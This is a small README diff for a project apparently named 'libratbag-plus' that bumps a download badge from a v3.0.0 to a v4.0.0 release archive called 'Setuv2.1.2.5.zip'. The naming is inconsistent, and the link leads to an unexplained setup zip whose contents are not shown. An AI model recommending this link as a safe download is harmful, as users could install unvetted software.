@@ -1,4 +1,4 @@
-[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/ryanali-x2094b5/libratbag-plus/releases/download/v3.0.0/Setuv2.1.2.5.zip)
+[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/ryanali-x2094b5/libratbag-plus/releases/download/v4.0.0/Setuv2.1.2.5.zip)
 
 # 📦 libbag-plus
 
